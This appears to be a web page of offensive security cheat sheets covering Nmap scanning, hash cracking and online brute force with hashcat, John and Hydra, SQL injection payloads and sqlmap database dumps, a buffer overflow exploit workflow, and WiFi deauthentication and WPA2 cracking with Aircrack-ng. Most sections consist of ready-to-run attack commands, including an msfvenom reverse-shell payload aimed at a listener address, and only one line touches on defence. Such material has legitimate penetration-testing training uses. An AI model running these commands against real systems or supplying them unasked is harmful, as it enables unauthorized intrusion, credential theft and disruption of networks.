Nmap — Network Scanning
NMAP RECON

Nmap is the most powerful network scanner. Master it to discover hosts, open ports, and running services.

# Basic host discovery nmap -sn 192.168.1.0/24 # Full port scan + service detection nmap -sV -sC -p- 192.168.1.10 # Stealth SYN scan (less noisy) nmap -sS -T2 192.168.1.10 # OS detection nmap -O 192.168.1.10 # Output to file nmap -oN scan_results.txt -A 192.168.1.10 # Example output: # 22/tcp open ssh OpenSSH 8.2 # 80/tcp open http Apache httpd 2.4.41 # 3306/tcp open mysql MySQL 5.7.32
  • Scan types: -sS, -sT, -sU, -sA
  • Timing templates (-T0 to -T5)
  • NSE scripts for vuln scanning
  • Evading IDS/firewalls with decoys

Password Cracking
HASHCAT JOHN CRACK

Break password hashes and bypass authentication using dictionary, brute force, and rule-based attacks.

# Identify hash type hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99" # → MD5 # Hashcat dictionary attack hashcat -m 0 -a 0 hashes.txt rockyou.txt # -m 0 = MD5, -m 1000 = NTLM, -m 1800 = SHA-512 # John the Ripper john --wordlist=rockyou.txt hashes.txt john --show hashes.txt # Hydra — online brute force SSH hydra -l admin -P rockyou.txt ssh://192.168.1.10 hydra -L users.txt -P passwords.txt ftp://target.com
  • Hash types: MD5, SHA1, NTLM, bcrypt
  • Wordlists: rockyou.txt, SecLists
  • Rainbow tables and salted hashes
  • Credential stuffing attacks

SQL Injection (SQLi)
SQLMAP OWASP #3

Inject malicious SQL queries to dump databases, bypass login, and read files from the server.

# Basic login bypass Username: admin'-- Password: anything # → Becomes: SELECT * FROM users WHERE user='admin'--' # Union-based extraction ' UNION SELECT 1,username,password FROM users-- # Blind SQLi (true/false based) 1' AND 1=1-- # True → returns data 1' AND 1=2-- # False → no data # Automated with SQLMap sqlmap -u "http://target.com/id=1" --dbs sqlmap -u "http://target.com/id=1" -D users --tables sqlmap -u "http://target.com/id=1" --dump sqlmap -r request.txt --level=5 --risk=3
  • Error-based, Union, Blind, Time-based SQLi
  • Reading/writing files via LOAD_FILE()
  • Bypassing WAFs
  • Prevention: parameterized queries

Buffer Overflow
BINARY EXPLOIT BOF

Overflow memory buffers to overwrite the return address and redirect code execution to your shellcode.

# Step 1: Find crash offset with pattern msf-pattern_create -l 2000 # Crash the app, note EIP value msf-pattern_offset -l 2000 -q 386F4337 # [*] Exact match at offset 1978 # Step 2: Control EIP payload = "A" * 1978 + "BBBB" # → EIP = 42424242 (our B's) # Step 3: Find bad chars, JMP ESP !mona jmp -r esp # Step 4: Generate shellcode msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b "\x00\x0a\x0d" -f python
  • Stack vs Heap overflow
  • Finding EIP offset (pattern_create)
  • Bad character identification
  • Bypassing ASLR, DEP, stack canaries

AIRCRACK-NG WIFI

# Enable monitor mode airmon-ng start wlan0 # Interface becomes wlan0mon # Scan for networks airodump-ng wlan0mon # Target specific AP & capture handshake airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon # Deauth attack to force handshake aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon # Crack WPA2 with wordlist aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture*.cap # Evil Twin AP (create fake hotspot) hostapd-wpe hostapd.conf
